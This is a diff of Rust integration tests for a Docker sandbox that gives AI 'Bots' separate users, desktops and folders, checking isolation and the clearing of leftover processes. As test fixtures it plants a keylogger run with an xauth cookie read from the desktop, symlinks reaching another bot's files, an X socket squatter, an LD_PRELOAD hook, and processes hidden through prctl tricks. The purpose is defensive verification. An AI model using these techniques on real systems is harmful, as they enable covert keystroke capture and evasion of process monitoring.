+    let (agent_b, _) = users_of(m, "c2r_b");
+    assert_ne!(agent_a, agent_b);
+    let zero = "0000000000000000";
+    assert!(out.stdout.contains(&format!("uid {agent_a} caps {zero} {zero} {zero} {zero} nnp 1")), "{}", out.stdout);
+    assert!(out.stdout.contains("env []"), "{}", out.stdout);
+    let id = p.run(m, &b, "id -u; id -G; pwd; echo $HOME", 5000).await.unwrap().stdout;
+    assert_eq!(id.lines().collect::<Vec<_>>(), [agent_b.to_string().as_str(), agent_b.to_string().as_str(), "/workspace/agents/c2r_b", "/home/box/agents/c2r_b"], "{id}");
+
+    // the agent's job: its files, by tool and by command, its home, the tools on its screen
+    let file = "/workspace/agents/c2r_a/out/report.txt";
+    p.write_file(m, file, b"from a tool").await.unwrap();
+    let seen = p.run(m, &a, "cat out/report.txt; echo more >> out/report.txt; mkdir -p deep/er && echo x > deep/er/y; echo h > ~/h; cat ~/h; stat -c %u out/report.txt", 5000).await.unwrap();
+    assert_eq!(seen.exit_code, Some(0), "{}", seen.stderr);
+    assert!(seen.stdout.contains("from a tool") && seen.stdout.contains(&agent_a.to_string()), "{}", seen.stdout);
+    assert_eq!(p.read_file(m, file).await.unwrap(), b"from a toolmore\n");
+    let link = p.run(m, &a, "ln -s /workspace/agents/c2r_b/secret peek; ln -s /run/box/x/svc.auth svc; true", 5000).await.unwrap();
+    assert_eq!(link.exit_code, Some(0));
+    p.write_file(m, "/workspace/agents/c2r_b/secret", b"b's").await.unwrap();
+    assert!(p.read_file(m, "/workspace/agents/c2r_a/peek").await.is_err(), "a link in a's folder reached b's file");
+    assert!(p.read_file(m, "/workspace/agents/c2r_a/svc").await.is_err(), "a link reached the services' cookies");
+    p.input(m, &a, &Input::Move { x: 77, y: 66 }).await.unwrap();
+    assert!(pointer(p, m, &a).await.contains("X=77"), "the tools still reach the screen");
+    assert!(p.screenshot(m, &a).await.unwrap().for_model().0.starts_with(&[0xFF, 0xD8]));
+    let chromium = docker(&["exec", "--user", "0", &name_of(m), "pgrep", "-u", &desktop_a.to_string(), "-c", "chromium"]);
+    assert_ne!(chromium, "0", "the Bot's browser runs as its desktop");
+    assert_eq!(docker(&["exec", "--user", "0", &name_of(m), "pgrep", "-u", &agent_a.to_string(), "-c", "chromium"]), "0");
+
+    // a recording and a download land in the Bot's folder, where it can read them
+    let id = p.record_start(m, &a).await.unwrap();
+    tokio::time::sleep(std::time::Duration::from_secs(2)).await;
+    let path = p.record_stop(m, &a, id).await.unwrap();
+    println!("recording at {path}");
+    assert!(path.starts_with("agents/c2r_a/recordings/"), "{path}");
+    let size = p.run(m, &a, &format!("stat -c '%u %s' /workspace/{path}"), 5000).await.unwrap().stdout;
+    assert!(size.starts_with(&agent_a.to_string()) && !size.trim().ends_with(" 0"), "{size}");
+    let serve = "import http.server as h\nclass H(h.BaseHTTPRequestHandler):\n    def do_GET(s):\n        s.send_response(200);s.send_header('Content-Disposition','attachment; filename=got.txt');s.send_header('Content-Length','4');s.end_headers();s.wfile.write(b'got\\n')\nh.HTTPServer(('127.0.0.1',8124),H).serve_forever()\n";
+    p.write_file(m, "/workspace/agents/c2r_a/srv.py", serve.as_bytes()).await.unwrap();
+    assert_eq!(p.run(m, &a, "setsid nohup python3 srv.py >srv.log 2>&1 &", 5000).await.unwrap().exit_code, Some(0));
+    tokio::time::sleep(std::time::Duration::from_secs(1)).await;
+    p.open_url(m, &a, "http://127.0.0.1:8124/got.txt").await.unwrap();
+    let mut got = String::new();
+    for _ in 0..60 {
+        got = p.run(m, &a, "cat got.txt 2>&1", 5000).await.unwrap().stdout;
+        if got.trim() == "got" {
+            break;
+        }
+        tokio::time::sleep(std::time::Duration::from_millis(500)).await;
+    }
+    assert_eq!(got.trim(), "got", "a download the Bot can't read: {}", docker(&["exec", "--user", "0", &name_of(m), "ls", "-la", "/workspace/agents/c2r_a"]));
+
+    // the check from outside: yes while it's so, and no the moment it isn't
+    let bots = ["c2r_a".to_owned(), "c2r_b".to_owned()];
+    assert!(p.users_apart(m, &bots).await.unwrap(), "the check from outside said no");
+    docker(&["exec", "--user", "0", &name_of(m), "chmod", "o+rx", "/workspace/agents/c2r_b"]);
+    assert!(!p.users_apart(m, &bots).await.unwrap(), "an open folder passed");
+    docker(&["exec", "--user", "0", &name_of(m), "chmod", "o-rx", "/workspace/agents/c2r_b"]);
+    assert!(p.users_apart(m, &bots).await.unwrap());
+    docker(&["exec", "-d", "--user", "0", &name_of(m), "setpriv", "--reuid=1000", "--regid=1000", "--groups=1400", "--inh-caps=-all", "Xvfb", ":70", "-ac", "-screen", "0", "64x64x24"]);
+    tokio::time::sleep(std::time::Duration::from_secs(1)).await;
+    assert!(!p.users_apart(m, &bots).await.unwrap(), "an open X server passed");
+    docker(&["exec", "--user", "0", &name_of(m), "pkill", "-f", "Xvfb :70"]);
+    tokio::time::sleep(std::time::Duration::from_millis(500)).await;
+    assert!(!p.users_apart(m, &["nobody".to_owned()]).await.unwrap_or(false), "a Bot with no user passed");
+
+    // a process holding a screen's name before it's up gets no screen, and no cookie
+    let squat = "import socket,time\ns=socket.socket(socket.AF_UNIX);s.bind('\\0/tmp/.X11-unix/X4');s.listen(5);s.settimeout(8)\ntry:\n    c,_=s.accept();print('HEARD',len(c.recv(256)))\nexcept socket.timeout:\n    print('heard nothing')\n";
+    p.write_file(m, "/workspace/agents/c2r_a/squat.py", squat.as_bytes()).await.unwrap();
+    assert_eq!(p.run(m, &a, "setsid nohup python3 squat.py > squat.log 2>&1 &", 5000).await.unwrap().exit_code, Some(0));
+    tokio::time::sleep(std::time::Duration::from_secs(1)).await;
+    let refused = p.screen_up(m, "c2r_c").await;
+    println!("with its name taken: {refused:?}");
+    assert!(refused.is_err(), "a screen came up behind a process holding its name");
+    tokio::time::sleep(std::time::Duration::from_secs(8)).await;
+    let heard = p.run(m, &a, "cat squat.log", 5000).await.unwrap().stdout;
+    assert!(heard.contains("heard nothing"), "{heard}");
+    let c = p.screen_up(m, "c2r_c").await.expect("the name's free now");
+    assert_eq!(c.display, ":4");
+
+    // a Bot that left: its screen and commands go, and its numbers stay its own
+    assert_eq!(p.run(m, &c, "setsid nohup sleep 300 >/dev/null 2>&1 &", 5000).await.unwrap().exit_code, Some(0));
+    let (agent_c, _) = users_of(m, "c2r_c");
+    p.screen_down(m, "c2r_c").await.unwrap();
+    assert_eq!(docker(&["exec", "--user", "0", &name_of(m), "pgrep", "-c", "-u", &agent_c.to_string()]), "0", "its commands went on");
+    let d = p.screen_up(m, "c2r_d").await.unwrap();
+    assert_eq!(d.display, ":4", "the slot is free for another");
+    assert_ne!(users_of(m, "c2r_d").0, agent_c, "a new Bot got an old Bot's user, and so its files");
+}
+
+/// What a hand-over clears: one Bot's desktop, of what isn't the desktop, wherever it hides. Commands
+/// and the other Bot's desktop aren't its business.
+#[tokio::test(flavor = "multi_thread")]
+#[ignore = "needs Docker and the computer image"]
+async fn clearing_ends_what_was_left_on_a_desktop_and_nothing_else() {
+    with_computer("c2k", |p, m, dir| async move { clear(&p, &m, &dir).await }).await;
+}
+
+async fn clear(p: &DockerProvider, m: &buwiz_computer::Machine, dir: &std::path::Path) {
     p.wake(m).await.unwrap();
     let a = p.screen_up(m, "c2k_a").await.unwrap();
+    let b = p.screen_up(m, "c2k_b").await.unwrap();
+    let (_, desktop_a) = users_of(m, "c2k_a");
     // something planted to start with the desktop, under its session: spared by nothing
     let plant = "mkdir -p ~/.config/autostart; printf '%s\\n' '[Desktop Entry]' 'Type=Application' 'Name=c2plant' 'Exec=python3 -c \"import time;time.sleep(600)\"' > ~/.config/autostart/c2plant.desktop";
-    assert_eq!(p.run(m, &a, plant, 5000).await.unwrap().exit_code, Some(0));
+    on_desktop(m, "c2k_a", &a, plant);
     p.sleep(m, Sleep::Deep).await.unwrap();
     p.wake(m).await.unwrap();
     let a = p.screen_up(m, "c2k_a").await.unwrap();
-    p.run(m, &a, "rm ~/.config/autostart/c2plant.desktop", 5000).await.unwrap();
+    let b_again = p.screen_up(m, "c2k_b").await.unwrap();
+    assert_eq!(b_again.display, b.display);
+    on_desktop(m, "c2k_a", &a, "rm ~/.config/autostart/c2plant.desktop");
     p.open_url(m, &a, "http://127.0.0.1:1/").await.unwrap();
     tokio::time::sleep(std::time::Duration::from_secs(3)).await;
 
-    p.write_file(m, "kl.py", KEYLOGGER.as_bytes()).await.unwrap();
-    let left = format!(
-        "setsid nohup python3 /workspace/kl.py {} /workspace/keys.log >/dev/null 2>&1 & setsid nohup sh -c 'while true; do sleep 0.05 & done' >/dev/null 2>&1 & VOXL_PASSWORD=$(head -c 24 /dev/urandom | od -An -tx1 | tr -d ' \\n') DISPLAY={} setsid nohup voxl --addr=127.0.0.1 --port=7000 >/dev/null 2>&1 & cp /usr/bin/python3 /workspace/innocent; setsid nohup /workspace/innocent -c 'import time;time.sleep(600)' >/dev/null 2>&1 &",
-        a.display, a.display
-    );
-    assert_eq!(p.run(m, &a, &left, 5000).await.unwrap().exit_code, Some(0));
+    // what was left: a keylogger, a forking loop, a copied interpreter, an allowed program with a
+    // library of its own, a name that isn't text, an undumpable process, and a leader that exited
+    let hook = hook_library(dir);
+    p.write_file(m, "/workspace/agents/c2k_a/hook.so", &hook).await.unwrap();
+    let quoted = KEYLOGGER.replace('\'', "'\\''");
+    let cookie = on_desktop(m, "c2k_a", &a, "xauth list | awk '{print $3}'");
+    on_desktop(m, "c2k_a", &a, &format!("KL_COOKIE={cookie} setsid nohup python3 -c '{quoted}' {} $HOME/keys.log >/dev/null 2>&1 &", a.display));
+    on_desktop(m, "c2k_a", &a, "setsid nohup sh -c 'while true; do sleep 0.05 & done' >/dev/null 2>&1 & cp /usr/bin/python3 $HOME/innocent; setsid nohup $HOME/innocent -c 'import time;time.sleep(600)' >/dev/null 2>&1 &");
+    on_desktop(m, "c2k_a", &a, "cp /workspace/agents/c2k_a/hook.so $HOME/hook.so; LD_PRELOAD=$HOME/hook.so setsid nohup /usr/bin/Xvfb :77 -screen 0 64x64x24 >/dev/null 2>&1 &");
+    let hiding = "import ctypes,os,sys,threading,time\nlibc=ctypes.CDLL(None)\nif sys.argv[1]=='name':\n    libc.prctl(15,b'\\xff\\xfe\\x80bad',0,0,0)\nelif sys.argv[1]=='undumpable':\n    libc.prctl(4,0,0,0,0)\nopen(os.path.expanduser('~/'+sys.argv[1]+'.pid'),'w').write(str(os.getpid()))\nif sys.argv[1]=='zombie':\n    threading.Thread(target=time.sleep,args=(600,)).start()\n    time.sleep(0.2)\n    libc.pthread_exit(None)\ntime.sleep(600)\n";
+    let quoted_hiding = hiding.replace('\'', "'\\''");
+    for how in ["name", "undumpable", "zombie"] {
+        on_desktop(m, "c2k_a", &a, &format!("setsid nohup python3 -c '{quoted_hiding}' {how} >/dev/null 2>&1 &"));
+    }
     tokio::time::sleep(std::time::Duration::from_secs(1)).await;
-    // a name that isn't text, and a process /proc says is root's: neither stops the scan or hides
-    let hiding = "import ctypes,os,sys,time\nlibc=ctypes.CDLL(None)\nif sys.argv[1]=='name':\n    libc.prctl(15,b'\\xff\\xfe\\x80bad',0,0,0)\nelse:\n    libc.prctl(4,0,0,0,0)\nopen('/workspace/'+sys.argv[1]+'.pid','w').write(str(os.getpid()))\ntime.sleep(600)\n";
-    p.write_file(m, "hiding.py", hiding.as_bytes()).await.unwrap();
-    assert_eq!(p.run(m, &a, "setsid nohup python3 /workspace/hiding.py name >/dev/null 2>&1 & setsid nohup python3 /workspace/hiding.py undumpable >/dev/null 2>&1 &", 5000).await.unwrap().exit_code, Some(0));
-    // a decoy keeper with a lower pid than the real one. Nothing in the box can get one: seccomp
-    // refuses `clone3`, and pids wrap to 300. So a helper in the box's pid namespace plants it, to
-    // show the scan goes by what can't be forged. What runs is the box user's, blocked on a fifo
-    let helper = format!("{}-helper", name_of(m));
-    let image = std::env::var(IMAGE_ENV).unwrap_or_else(|_| "buwiz-computer:local".to_owned());
-    docker(&["run", "-d", "--rm", "--name", &helper, "--pid", &format!("container:{}", name_of(m)), "--network", "none", "--privileged", "--security-opt", "seccomp=unconfined", "--user", "0", "--entrypoint", "sleep", &image, "120"]);
-    let keeper_pid: u32 = docker(&["exec", "--user", "0", &helper, "sh", "-c", "for p in $(pgrep -x box-keeper); do [ \"$(awk '{print $4}' /proc/$p/stat)\" = 1 ] && echo $p; done"]).parse().unwrap();
-    let low = keeper_pid - 1;
-    let planted = docker(&["exec", "--user", "0", &helper, "/usr/bin/python3", "-I", "-S", "-c", DECOY, &low.to_string()]);
-    assert_eq!(planted, format!("decoy {low}"), "the decoy never got its pid");
+    let zombie = on_desktop(m, "c2k_a", &a, "cat ~/zombie.pid");
+    let state = docker(&["exec", "--user", "0", &name_of(m), "sh", "-c", &format!("awk '{{print $3}}' /proc/{zombie}/stat; ls /proc/{zombie}/task | wc -l")]);
+    println!("the exited leader: {state:?}");
+    assert!(state.starts_with("Z\n2"), "it isn't a zombie leader with a live thread, so this proves nothing: {state}");
+    // non-dumpable and root's in /proc, or the Uid line: what's true decides the comment
+    let undumpable = on_desktop(m, "c2k_a", &a, "cat ~/undumpable.pid");
+    let owners = docker(&["exec", "--user", "0", &name_of(m), "sh", "-c", &format!("stat -c '%u %n' /proc/{undumpable} /proc/{undumpable}/status /proc/{undumpable}/mem; grep ^Uid /proc/{undumpable}/status")]);
+    println!("what /proc says of a non-dumpable process:\n{owners}");
+
+    // beside it: a command, and the other Bot's own stray
+    assert_eq!(p.run(m, &a, "setsid nohup python3 -c 'import time;time.sleep(600)' >/dev/null 2>&1 &", 5000).await.unwrap().exit_code, Some(0));
+    on_desktop(m, "c2k_b", &b, "setsid nohup python3 -c 'import time;time.sleep(601)' >/dev/null 2>&1 &");
     tokio::time::sleep(std::time::Duration::from_millis(300)).await;
-    let seen = docker(&["exec", "--user", "0", "--privileged", &name_of(m), "sh", "-c", &format!("readlink /proc/{low}/exe; awk '{{print $4}}' /proc/{low}/stat; grep '^Uid' /proc/{low}/status")]);
-    println!("real keeper {keeper_pid}; the decoy at {low}, as the box sees it: {seen:?}");
-    assert!(seen.starts_with("/usr/local/bin/box-keeper\n1\nUid:\t1000"), "the decoy isn't one: {seen}");
-    let before = p.run(m, &a, "ps -eo pid,ppid,comm --forest | cut -c1-70", 5000).await.unwrap().stdout;
-    println!("before:\n{before}");
 
     let gate = Gate::start().await.unwrap();
     let (mut ws, ..) = real_socket(&gate, "c2k_a", p.viewer(m, &a).await.unwrap().unwrap(), Mode::Drive).await;
-    let keys = async || p.read_file(m, "keys.log").await.map(|b| String::from_utf8_lossy(&b).matches("key ").count()).unwrap_or(0);
-    ws.write_all(&command("k,97,1")).await.unwrap();
-    ws.write_all(&command("k,97,0")).await.unwrap();
-    tokio::time::sleep(std::time::Duration::from_millis(500)).await;
-    assert_eq!(keys().await, 1, "the keylogger must work, or this proves nothing");
+    type_key(&mut ws, 97).await;
+    let keys = || on_desktop(m, "c2k_a", &a, "cat ~/keys.log").matches("key ").count();
+    assert_eq!(keys(), 1, "the keylogger must work, or this proves nothing");
 
-    let ended = p.clear_strays(m).await.unwrap();
+    let ended = p.clear_strays(m, &a).await.unwrap();
     println!("ended: {ended:?}");
     assert!(!ended.iter().any(|n| n == "box-active-tab"), "the browser's own helper went: {ended:?}");
-    assert!(ended.iter().any(|n| n == "box-keeper"), "the decoy was spared: {ended:?}");
-    let gone = format!("for f in name undumpable; do test -d /proc/$(cat /workspace/$f.pid) && echo $f survived; done; test -d /proc/{low} && echo decoy survived; true");
-    let survived = p.run(m, &a, &gone, 5000).await.unwrap().stdout;
-    assert_eq!(survived.trim(), "", "hidden from the scan");
-    let after = p.run(m, &a, "ps -eo pid,ppid,comm,args --forest | cut -c1-100", 5000).await.unwrap().stdout;
+    assert!(ended.iter().any(|n| n == "Xvfb"), "the allowed program with a library was spared: {ended:?}");
+    let after = docker(&["exec", "--user", "0", &name_of(m), "ps", "-eo", "pid,uid,stat,comm,args", "--forest"]);
     println!("after:\n{after}");
-    for word in ["kl.py", "innocent", "--port=7000", "time.sleep(600)", "sleep 0.05"] {
-        assert!(!after.contains(word), "{word} survived:\n{after}");
+    let mine: String = after.lines().filter(|l| l.split_whitespace().nth(1) == Some(&desktop_a.to_string())).collect::<Vec<_>>().join("\n");
+    for word in ["KL_COOKIE", "innocent", "time.sleep(600)", "sleep 0.05", "while true", "Xvfb :77"] {
+        assert!(!mine.contains(word), "{word} survived:\n{mine}");
     }
+    let gone = format!("for f in name undumpable zombie; do test -d /proc/$(cat ~/$f.pid) && echo $f survived; done; true");
+    assert_eq!(on_desktop(m, "c2k_a", &a, &gone), "", "hidden from the scan");
     for word in ["box-keeper", "box-exec", "box-host", "--port=6901", "--port=6902", "xfce4-session", "xfwm4", "xfce4-panel", "/usr/lib/chromium/chromium", "Xvfb :1", "Xvfb :2"] {
         assert!(after.contains(word), "{word} went:\n{after}");
     }
+    assert!(after.contains("time.sleep(601)"), "the other Bot's work went:\n{after}");
+    assert!(after.contains("time.sleep(600)"), "a command went, and it couldn't see anything:\n{after}");
 
     // the person types: nothing hears it, then or later; the desktop is still theirs
-    ws.write_all(&command("k,98,1")).await.unwrap();
-    ws.write_all(&command("k,98,0")).await.unwrap();
+    type_key(&mut ws, 98).await;
     ws.write_all(&command("m,222,111")).await.unwrap();
     assert!(pointer(p, m, &a).await.contains("X=222"), "the person's input stopped reaching the desktop");
-    assert_eq!(keys().await, 1, "a key was logged after the clearing");
+    assert_eq!(keys(), 1, "a key was logged after the clearing");
     assert!(p.screenshot(m, &a).await.is_ok());
-    assert_eq!(p.clear_strays(m).await.unwrap(), Vec::<String>::new(), "a second pass finds nothing: the desktop isn't a stray");
-    assert_ne!(p.run(m, &a, "pgrep -c chromium", 5000).await.unwrap().stdout.trim(), "0", "the browser went");
+    assert_eq!(p.clear_strays(m, &a).await.unwrap(), Vec::<String>::new(), "a second pass finds nothing: the desktop isn't a stray");
+    assert_ne!(docker(&["exec", "--user", "0", &name_of(m), "pgrep", "-c", "-u", &desktop_a.to_string(), "chromium"]), "0", "the browser went");
+}
+
+/// A computer made on an image from before users, with what that image left on its volumes: files
+/// owned by the one user, a planted autostart, a link. Waking it makes it again, keeps every file,
+/// gives each Bot its own and runs nothing that was planted.
+#[tokio::test(flavor = "multi_thread")]
+#[ignore = "needs Docker and the computer image"]
+async fn a_computer_from_before_users_wakes_with_its_files_and_nothing_planted_runs() {
+    with_computer("c2o", |p, m, _| async move { old_computer(&p, &m).await }).await;
+}
+
+async fn old_computer(p: &DockerProvider, m: &buwiz_computer::Machine) {
+    let name = name_of(m);
+    let old = "alpine:latest";
+    docker(&["rm", "-f", &name, &format!("{name}-wall")]);
+    let seed = r#"
+        mkdir -p /workspace/agents/c2o_a/notes /workspace/shared /home/box/.config/autostart /home/box/chrome-profile/bots/c2o_a/Default /home/box/.box-screens
+        echo mine > /workspace/agents/c2o_a/notes/keep.txt
+        echo loose > /workspace/loose.txt
+        ln -s /etc/passwd /workspace/agents/c2o_a/link
+        ln -s /etc /workspace/agents/c2o_a/dir-link
+        echo cookies > /home/box/chrome-profile/bots/c2o_a/Default/Cookies
+        echo 2 > /home/box/.box-screens/c2o_a
+        printf '[Desktop Entry]\nType=Application\nName=old\nExec=touch /tmp/planted-ran\n' > /home/box/.config/autostart/old.desktop
+        echo 'touch /tmp/planted-ran' > /home/box/.bashrc
+        chown -hR 1000:1000 /workspace /home/box
+    "#;
+    docker(&["run", "--rm", "--mount", &format!("type=volume,source={name}-workspace,target=/workspace"), "--mount", &format!("type=volume,source={name}-home,target=/home/box"), old, "sh", "-c", seed]);
+    // what Docker holds of an old computer: neither container has the label
+    docker(&["create", "--name", &format!("{name}-wall"), "--label", &format!("app.buwiz.computer.id=cmp_c2otest"), old, "sleep", "infinity"]);
+    docker(&["create", "--name", &name, "--network", &format!("container:{name}-wall"), "--mount", &format!("type=volume,source={name}-workspace,target=/workspace"), "--mount", &format!("type=volume,source={name}-home,target=/home/box"), old, "sleep", "infinity"]);
+
+    p.wake(m).await.unwrap();
+    assert_eq!(docker(&["inspect", &name, "--format", "{{index .Config.Labels \"app.buwiz.box.users\"}}"]), "1", "it wasn't made again");
+    let a = p.screen_up(m, "c2o_a").await.unwrap();
+    let (agent, _) = users_of(m, "c2o_a");
+    assert_eq!(p.read_file(m, "/workspace/agents/c2o_a/notes/keep.txt").await.unwrap(), b"mine\n");
+    let own = p.run(m, &a, "stat -c %u notes/keep.txt; echo more >> notes/keep.txt; cat notes/keep.txt", 5000).await.unwrap();
+    assert_eq!(own.exit_code, Some(0), "{}", own.stderr);
+    assert!(own.stdout.starts_with(&agent.to_string()) && own.stdout.contains("more"), "{}", own.stdout);
+    let as_root = |script: &str| docker(&["exec", "--user", "0", &name, "sh", "-c", script]);
+    assert_eq!(as_root("stat -c '%U %u' /etc/passwd /etc"), "root 0\nroot 0", "a link was followed");
+    assert_eq!(as_root("stat -c %u /workspace/agents/c2o_a/link"), agent.to_string());
+    assert_eq!(as_root("cat /workspace/loose.txt"), "loose");
+    assert_eq!(as_root("cat /home/box/old-home-*/chrome-profile/bots/c2o_a/Default/Cookies"), "cookies", "the old home went");
+    assert_eq!(as_root("stat -c %a /home/box/old-home-*"), "700");
+    assert_eq!(as_root("stat -c %u /home/box/old-home-*/.bashrc"), "1500");
+    assert_eq!(as_root("stat -c %u /home/box"), "0");
+    assert_eq!(as_root("test -e /home/box/desktops/c2o_a/.config/autostart/old.desktop && echo there"), "", "the plant came along");
+    tokio::time::sleep(std::time::Duration::from_secs(3)).await;
+    assert_eq!(as_root("ls /tmp/planted-ran 2>/dev/null"), "", "something planted ran");
+    let old_home = as_root("ls -d /home/box/old-home-*");
+    assert_ne!(p.run(m, &a, &format!("ls {old_home}"), 5000).await.unwrap().exit_code, Some(0), "a Bot reached the old home");
+
+    // and it stays so: a second start doesn't move anything again
+    p.sleep(m, Sleep::Deep).await.unwrap();
+    p.wake(m).await.unwrap();
+    assert_eq!(as_root("ls -d /home/box/old-home-* | wc -l"), "1");
+    p.screen_up(m, "c2o_a").await.unwrap();
+    assert!(p.read_file(m, "/workspace/agents/c2o_a/notes/keep.txt").await.unwrap().ends_with(b"more\n"));
 }
